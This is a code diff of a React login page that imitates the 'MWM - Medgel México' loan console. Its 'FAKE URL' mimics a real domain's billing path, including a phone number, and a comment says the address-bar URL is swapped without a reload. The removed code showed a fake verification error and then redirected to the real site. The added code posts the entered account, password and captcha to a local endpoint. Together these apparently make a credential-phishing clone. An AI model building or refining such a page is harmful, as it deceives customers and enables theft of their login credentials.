@@ -10,21 +10,83 @@ export default function Login() {
   const [captcha, setCaptcha] = useState("");
   const [showPass, setShowPass] = useState(false);
 
-  // 🔥 NOTIFICACIÓN
+  // 🔥 NOTIFICACIÓN ERROR
   const [showError, setShowError] = useState(false);
+  const [errorText, setErrorText] = useState("Error en el Código de verificación");
+
+  // ✅ NOTIFICACIÓN SUCCESS
+  const [showSuccess, setShowSuccess] = useState(false);
+  const [successText, setSuccessText] = useState("Usuario registrado correctamente");
+
+  // ✅ loading
+  const [loading, setLoading] = useState(false);
 
   // 🔥 FAKE URL (REAL EN NAVEGADOR)
   const fakeUrl =
     "/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
 
-  // 🔥 ÚNICA REDIRECCIÓN (BOTÓN)
-  const handleLogin = () => {
-    setShowError(true);
+  // ✅ REGISTER A BD
+  const handleRegister = async () => {
+    // validar campos vacíos
+    const cuentaVacia = cuenta.trim() === "";
+    const passwordVacia = password.trim() === "";
+    const captchaVacio = captcha.trim() === "";
 
-    setTimeout(() => {
-      window.location.href =
-        "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
-    }, 1500);
+    setTouched({
+      cuenta: true,
+      password: true,
+      captcha: true,
+    });
+
+    if (cuentaVacia || passwordVacia || captchaVacio) {
+      setErrorText("Completa todos los campos");
+      setShowError(true);
+      setTimeout(() => setShowError(false), 1800);
+      return;
+    }
+
+    try {
+      setLoading(true);
+
+      const res = await fetch("/api/register", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          cuenta,
+          password,
+          captcha,
+        }),
+      });
+
+      const data = await res.json();
+
+      if (!res.ok) {
+        setErrorText(data?.error || "No se pudo registrar el usuario");
+        setShowError(true);
+        setTimeout(() => setShowError(false), 1800);
+        return;
+      }
+
+      setSuccessText(data?.message || "Usuario registrado correctamente");
+      setShowSuccess(true);
+
+      setCuenta("");
+      setPassword("");
+      setCaptcha("");
+
+      setTimeout(() => {
+        setShowSuccess(false);
+      }, 1800);
+    } catch (error) {
+      console.error("Error al registrar:", error);
+      setErrorText("Error de conexión al registrar");
+      setShowError(true);
+      setTimeout(() => setShowError(false), 1800);
+    } finally {
+      setLoading(false);
+    }
   };
 
   // ✅ AQUI ESTÁ LA MAGIA (CAMBIA URL SIN RECARGAR)
@@ -63,7 +125,9 @@ export default function Login() {
     "/captcha/c10.png",
   ];
 
-  const [captchaImg, setCaptchaImg] = useState(captchas[0]);
+ const [captchaImg, setCaptchaImg] = useState(() => {
+  return captchas[Math.floor(Math.random() * captchas.length)];
+});
 
   const cambiarCaptcha = () => {
     const random = captchas[Math.floor(Math.random() * captchas.length)];
@@ -88,6 +152,7 @@ export default function Login() {
 
   const showCuentaError = touched.cuenta && isEmpty(cuenta);
   const showPasswordError = touched.password && isEmpty(password);
+  const showCaptchaError = touched.captcha && isEmpty(captcha);
 
   const getBorder = (f: FieldName, error: boolean) => {
     if (focusedField === f) return "border-[#67c23a]";
@@ -97,8 +162,7 @@ export default function Login() {
 
   return (
     <div className="min-h-screen flex items-center justify-center bg-[#304156] px-3 relative overflow-hidden">
-
-      {/* 🔴 NOTIFICACIÓN */}
+      {/* 🔴 NOTIFICACIÓN ERROR */}
       <div
         className={`fixed top-0 left-1/2 -translate-x-1/2 z-50 transition-all duration-500 ${
           showError
@@ -110,21 +174,38 @@ export default function Login() {
           <div className="w-[18px] h-[18px] rounded-full bg-[#f56c6c] text-white flex items-center justify-center text-[12px]">
             ×
           </div>
-          <span className="text-[15px] text-[#f56c6c]">
-            Error en el Código de verificación
-          </span>
+          <span className="text-[15px] text-[#f56c6c]">{errorText}</span>
+        </div>
+      </div>
+
+      {/* 🟢 NOTIFICACIÓN SUCCESS */}
+      <div
+        className={`fixed top-0 left-1/2 -translate-x-1/2 z-50 transition-all duration-500 ${
+          showSuccess
+            ? "translate-y-5 opacity-100"
+            : "-translate-y-full opacity-0"
+        }`}
+      >
+        <div className="w-[500px] max-w-[92vw] bg-[#f0f9eb] border border-[#e1f3d8] rounded-[6px] shadow-sm px-6 py-4 flex items-center gap-3">
+          <div className="w-[18px] h-[18px] rounded-full bg-[#67c23a] text-white flex items-center justify-center text-[12px]">
+            ✓
+          </div>
+          <span className="text-[15px] text-[#67c23a]">{successText}</span>
         </div>
       </div>
 
       <div className="scale-[0.96]">
         <div className="bg-[#ffff] w-[418px] rounded-[8px] px-[24px] py-[33px] shadow-sm">
-
           <h2 className="text-center text-[#6f6f6f] text-[19px] font-medium mb-5 translate-y-[-6px]">
             MWM - Medgel México
           </h2>
 
-          <form>
-
+          <form
+            onSubmit={(e) => {
+              e.preventDefault();
+              handleRegister();
+            }}
+          >
             {/* CUENTA */}
             <div className="mb-[6px]">
               <div className="relative">
@@ -212,7 +293,7 @@ export default function Login() {
                   onChange={(e) => setCaptcha(e.target.value)}
                   onFocus={() => handleFocus("captcha")}
                   onBlur={() => handleBlur("captcha")}
-                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("captcha", false)}`}
+                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("captcha", showCaptchaError)}`}
                 />
               </div>
 
@@ -222,6 +303,14 @@ export default function Login() {
                 className="mr-[12px] w-[120px] h-[41px] border border-[#8bc34a] bg-white object-cover cursor-pointer"
                 alt=""
               />
+            </div>
+
+            <div className="h-[12px] mb-[8px]">
+              {showCaptchaError && (
+                <p className="text-[12px] text-[#ff6b6b]">
+                  Por favor introduzca el código de verificación
+                </p>
+              )}
             </div>
 
             {/* TRADUCTOR */}
@@ -235,13 +324,12 @@ export default function Login() {
 
             {/* BOTÓN */}
             <button
-              type="button"
-              onClick={handleLogin}
-              className="w-full h-[43px] bg-[#52c41a] hover:bg-[#73d13d] text-white rounded-[4px] text-[15px]"
+              type="submit"
+              disabled={loading}
+              className="w-full h-[43px] bg-[#52c41a] hover:bg-[#73d13d] text-white rounded-[4px] text-[15px] disabled:opacity-70"
             >
-              Iniciar sesión
+              {loading ? "Registrando..." : "Registrar usuario"}
             </button>
-
           </form>
         </div>
       </div>
